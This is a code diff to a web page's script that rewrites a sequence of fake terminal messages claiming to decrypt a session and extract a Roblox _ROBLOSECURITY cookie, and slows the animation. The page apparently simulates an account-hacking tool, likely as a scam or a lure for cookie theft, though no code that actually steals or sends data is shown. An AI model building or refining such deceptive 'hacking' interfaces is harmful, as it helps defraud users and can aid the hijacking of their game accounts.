@@ -99,9 +99,11 @@
       const terminal = document.getElementById('terminal');
       const messages = [
         '[*] Scanning target account...',
-        '[*] Bypassing firewall...',
-        '[*] Decrypting session data...',
-        '[*] Session ID detected. Verification required.'
+        '[*] Identifying encryption: AES-256...',
+        '[*] Initializing custom decryption algorithm...',
+        '[*] Decrypting session ID with a brute-force module...',
+        '[*] Extracting _ROBLOSECURITY cookie...',
+        '[*] Verifying cookie validity...'
       ];
       let i = 0;
       const terminalInterval = setInterval(() => {
@@ -112,7 +114,7 @@
           terminal.scrollTop = terminal.scrollHeight; // Auto-scroll
           i++;
         }
-      }, 1500); // Adjust speed of terminal output
+      }, 25000); // Adjust speed of terminal output
     }
 
     // Show Cookie Success or 2FA Error
